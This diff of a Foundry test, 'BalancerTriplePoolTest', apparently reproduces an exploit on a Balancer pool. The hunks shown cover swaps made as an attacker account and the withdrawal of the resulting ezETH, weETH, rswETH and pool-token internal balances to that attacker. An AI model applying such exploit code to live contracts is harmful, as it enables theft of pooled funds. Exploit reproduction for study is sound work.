                 userData: ""
-            });
+           });
 
             try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) {
                 successCount++;
@@ -901,14 +222,13 @@ contract BalancerTriplePoolTest is Test {
         }
 
         console.log("Swaps executed:", successCount, "/", swaps.length);
+        console.log("=== WITHDRAWAL manageUserBalance()");
 
-        // withdraw manageUserBalance
         IERC20[] memory internalTokens = new IERC20[](4);
         internalTokens[0] = IERC20(TRIPLE_BPT);
         internalTokens[1] = IERC20(ezETH);
         internalTokens[2] = IERC20(weETH);
         internalTokens[3] = IERC20(rswETH);
-
         uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);
 
         console.log("Internal balances:");
@@ -923,54 +243,15 @@ contract BalancerTriplePoolTest is Test {
             if (internalBalances[1] > 0) opsCount++;
             if (internalBalances[2] > 0) opsCount++;
             if (internalBalances[3] > 0) opsCount++;
-
             IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
             uint256 opIndex = 0;
-
-            if (internalBalances[0] > 0) {
-                ops[opIndex++] = IBalancerVault.UserBalanceOp({
-                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
-                    asset: IAsset(TRIPLE_BPT),
-                    amount: internalBalances[0],
-                    sender: ATTACKER,
-                    recipient: payable(ATTACKER)
-                });
-            }
-
-            if (internalBalances[1] > 0) {
-                ops[opIndex++] = IBalancerVault.UserBalanceOp({
-                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
-                    asset: IAsset(ezETH),
-                    amount: internalBalances[1],
-                    sender: ATTACKER,
-                    recipient: payable(ATTACKER)
-                });
-            }
-
-            if (internalBalances[2] > 0) {
-                ops[opIndex++] = IBalancerVault.UserBalanceOp({
-                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
-                    asset: IAsset(weETH),
-                    amount: internalBalances[2],
-                    sender: ATTACKER,
-                    recipient: payable(ATTACKER)
-                });
-            }
-
-            if (internalBalances[3] > 0) {
-                ops[opIndex] = IBalancerVault.UserBalanceOp({
-                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
-                    asset: IAsset(rswETH),
-                    amount: internalBalances[3],
-                    sender: ATTACKER,
-                    recipient: payable(ATTACKER)
-                });
-            }
-
+            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(TRIPLE_BPT), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
+            if (internalBalances[1] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(ezETH), amount: internalBalances[1], sender: ATTACKER, recipient: payable(ATTACKER)});
+            if (internalBalances[2] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(weETH), amount: internalBalances[2], sender: ATTACKER, recipient: payable(ATTACKER)});
+            if (internalBalances[3] > 0) ops[opIndex] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(rswETH), amount: internalBalances[3], sender: ATTACKER, recipient: payable(ATTACKER)});
             VAULT.manageUserBalance(ops);
             console.log("Withdrawal completed!");
         }
-
         vm.stopPrank();
 
         (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_TRIPLE);
